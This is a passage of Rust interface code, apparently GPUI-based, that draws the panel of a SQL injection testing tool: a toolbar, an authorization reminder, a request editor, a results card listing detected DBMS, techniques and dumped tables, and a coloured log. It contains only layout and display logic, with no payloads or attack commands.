                    .flex()
                    .items_center()
                    .gap(px(6.0))
                    .flex_shrink_0()
                    .child(Icon::new(IconName::Layers).size(px(15.0)).color(c.text_subtle))
                    .child(
                        div()
                            .text_size(t.font_size.xs)
                            .text_color(c.text_subtle)
                            .child(self.lang.t("Injection point")),
                    )
                    .child(point_select),
            )
            .child(
                div()
                    .flex()
                    .items_center()
                    .gap(px(6.0))
                    .flex_shrink_0()
                    .child(
                        div()
                            .text_size(t.font_size.xs)
                            .text_color(c.text_subtle)
                            .child(self.lang.t("Delay")),
                    )
                    .child(secs_select),
            )
            .child(
                div()
                    .flex()
                    .items_center()
                    .gap(px(6.0))
                    .flex_shrink_0()
                    .child(
                        div()
                            .text_size(t.font_size.xs)
                            .text_color(c.text_subtle)
                            .child(self.lang.t("Dump schema")),
                    )
                    .child(
                        Switch::new("sqli-dump", self.sqli_dump).on_toggle(cx.listener(
                            |this, _e, _w, cx| {
                                this.sqli_dump = !this.sqli_dump;
                                cx.notify();
                            },
                        )),
                    ),
            )
            .child(action);
        if let Some(p) = &self.sqli_progress {
            toolbar = toolbar.child(
                div()
                    .text_size(t.font_size.xs)
                    .text_color(if self.sqli_busy { c.warning } else { c.text_muted })
                    .child(p.clone()),
            );
        }

        let hint = div()
            .flex_shrink_0()
            .text_size(t.font_size.xs)
            .text_color(c.text_subtle)
            .child(self.lang.t("Only test targets you are authorized to assess."));

        // 左:目标 + 可编辑请求。
        let left = div()
            .flex()
            .flex_col()
            .gap(t.space.sm)
            .flex_1()
            .min_w(px(0.0))
            .child(section_label(self.lang.t("Target"), c, t))
            .child(self.sqli_target.clone())
            .child(section_label(self.lang.t("Request"), c, t))
            .child(
                div()
                    .id("sqli-req-scroll")
                    .flex_1()
                    .min_h(px(0.0))
                    .overflow_y_scroll()
                    .rounded(t.radius.lg)
                    .border_1()
                    .border_color(c.border)
                    .bg(c.surface)
                    .p(t.space.sm)
                    .child(self.sqli_req.clone()),
            );

        // 右:结论卡 + 日志。
        let right = div()
            .flex()
            .flex_col()
            .gap(t.space.sm)
            .flex_1()
            .min_w(px(0.0))
            .child(self.sqli_report_card(c, t))
            .child(self.sqli_log_view(c, t));

        let body = div()
            .flex_1()
            .min_h(px(0.0))
            .flex()
            .gap(t.space.md)
            .child(left)
            .child(right);

        div()
            .flex_1()
            .min_h(px(0.0))
            .flex()
            .flex_col()
            .gap(t.space.md)
            .p(t.space.lg)
            .child(toolbar)
            .child(hint)
            .child(divider(c))
            .child(body)
    }

    /// 结论卡:可注入徽标 + 注入点 / 库 / 技术 / 边界 + 取到的版本 / 用户 / 库。
    fn sqli_report_card(&self, c: ThemeColors, t: Tokens) -> AnyElement {
        if self.sqli_log.is_empty() {
            return EmptyState::new(self.lang.t("Configure a request and start testing"))
                .icon(IconName::Layers)
                .into_any_element();
        }
        let r = &self.sqli_report;
        let (badge_text, badge_color) = if r.injectable {
            (self.lang.t("Injectable"), c.danger)
        } else if self.sqli_busy {
            (self.lang.t("Testing…"), c.warning)
        } else {
            (self.lang.t("No SQL injection found"), c.text_subtle)
        };
        let mut card = div()
            .flex()
            .flex_col()
            .gap(px(6.0))
            .flex_shrink_0()
            .p(t.space.md)
            .rounded(t.radius.lg)
            .bg(c.surface)
            .border_1()
            .border_color(if r.injectable { c.danger } else { c.border })
            .child(
                div()
                    .flex()
                    .items_center()
                    .gap(t.space.sm)
                    .child(Badge::new(badge_text, badge_color))
                    .child(
                        div()
                            .text_size(t.font_size.sm)
                            .font_weight(FontWeight::SEMIBOLD)
                            .text_color(c.text)
                            .child(self.lang.t("SQL injection")),
                    ),
            );
        if r.injectable {
            if let Some(p) = &r.point {
                card = card.child(FieldRow::new(self.lang.t("Injection point"), p.label()));
            }
            if let Some(d) = r.dbms {
                card = card.child(FieldRow::new(self.lang.t("DBMS"), d.label()));
            }
            if !r.techniques.is_empty() {
                let techs = r
                    .techniques
                    .iter()
                    .map(|x| self.lang.t(x.label()).to_string())
                    .collect::<Vec<_>>()
                    .join(" · ");
                card = card.child(FieldRow::new(self.lang.t("Techniques"), techs));
            }
            if let Some(b) = r.boundary {
                card = card.child(FieldRow::new(self.lang.t("Boundary"), b.label()));
            }
            let data = [
                (Scalar::Version, &r.version),
                (Scalar::User, &r.user),
                (Scalar::Database, &r.database),
            ];
            if data.iter().any(|(_, v)| v.is_some()) {
                card = card.child(divider(c));
                for (s, v) in data {
                    if let Some(val) = v {
                        card = card.child(
                            FieldRow::new(self.lang.t(s.label()), val.clone()).mono(),
                        );
                    }
                }
            }
            if !r.tables.is_empty() {
                card = card.child(divider(c)).child(
                    div()
                        .text_size(t.font_size.xs)
                        .text_color(c.text_subtle)
                        .child(format!("{} ({})", self.lang.t("Tables"), r.tables.len())),
                );
                for td in &r.tables {
                    card = card.child(self.sqli_table_view(td, c, t));
                }
            }
        }
        card.into_any_element()
    }

    /// 单张枚举 / dump 出的表:表名 + 行数 + 列名 + 样本行(等宽)。
    fn sqli_table_view(&self, td: &SqliTableDump, c: ThemeColors, t: Tokens) -> AnyElement {
        let mut block = div()
            .flex()
            .flex_col()
            .gap(px(2.0))
            .flex_shrink_0()
            .p(t.space.sm)
            .rounded(t.radius.md)
            .bg(c.elevated)
            .border_1()
            .border_color(c.border);
        let title = match td.row_count {
            Some(n) => format!("{} · {} {}", td.name, n, self.lang.t("rows")),
            None => td.name.clone(),
        };
        block = block.child(
            div()
                .font_family(crate::model::MONO)
                .text_size(t.font_size.xs)
                .text_color(c.text)
                .font_weight(FontWeight::SEMIBOLD)
                .child(title),
        );
        if !td.columns.is_empty() {
            block = block.child(
                div()
                    .font_family(crate::model::MONO)
                    .text_size(t.font_size.xs)
                    .text_color(c.accent)
                    .child(td.columns.join(" | ")),
            );
        }
        for row in &td.rows {
            block = block.child(
                div()
                    .font_family(crate::model::MONO)
                    .text_size(t.font_size.xs)
                    .text_color(c.text_muted)
                    .truncate()
                    .child(truncate(&row.join(" | "), 160)),
            );
        }
        block.into_any_element()
    }

    /// 测试日志列表(彩色,最近 300 行)。
    fn sqli_log_view(&self, c: ThemeColors, t: Tokens) -> impl IntoElement {
        let mut list = div()
            .id("sqli-log")
            .flex_1()
            .min_h(px(0.0))
            .overflow_y_scroll()
            .flex()
            .flex_col()
            .gap(px(2.0))
            .p(t.space.sm)
            .rounded(t.radius.lg)
            .bg(c.surface)
            .border_1()
            .border_color(c.border)
            .font_family(crate::model::MONO);
        let start = self.sqli_log.len().saturating_sub(300);
        for l in &self.sqli_log[start..] {
            let col = match l.level {
                SqliLevel::Good => c.success,
                SqliLevel::Warn => c.warning,
                SqliLevel::Bad => c.danger,
                SqliLevel::Info => c.text_muted,
            };
            list = list.child(
                div()
                    .text_size(t.font_size.xs)
                    .text_color(col)
                    .child(l.text.clone()),
            );
        }
        list
    }
}


